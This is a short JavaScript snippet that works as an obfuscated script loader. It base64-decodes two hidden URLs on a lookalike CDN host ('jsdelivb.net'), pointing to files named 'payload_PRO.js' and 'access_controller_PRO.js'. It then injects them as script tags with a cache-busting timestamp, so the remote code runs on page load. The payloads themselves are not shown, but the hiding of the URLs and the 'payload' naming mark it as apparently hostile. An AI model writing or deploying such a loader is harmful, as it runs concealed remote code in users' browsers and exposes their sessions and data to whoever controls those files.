(function(){
    const urls = [
        "aHR0cHM6Ly9jZG4uanNkZWxpdmIubmV0L2doL2h1aWhvYW5nYWRtL25hei1hdXRvLXZpcC9wYXlsb2FkX1BSTy5qcz91PQ==",
        "aHR0cHM6Ly9jZG4uanNkZWxpdmIubmV0L2doL2h1aWhvYW5nYWRtL25hei1hdXRvLXZpcC9hY2Nlc3NfY29udHJvbGxlcl9QUk8uanM/dT0="
    ];

    urls.forEach(u=>{
        let s=document.createElement("script");
        s.src = atob(u) + Date.now();
        document.body.appendChild(s);
    });
})();
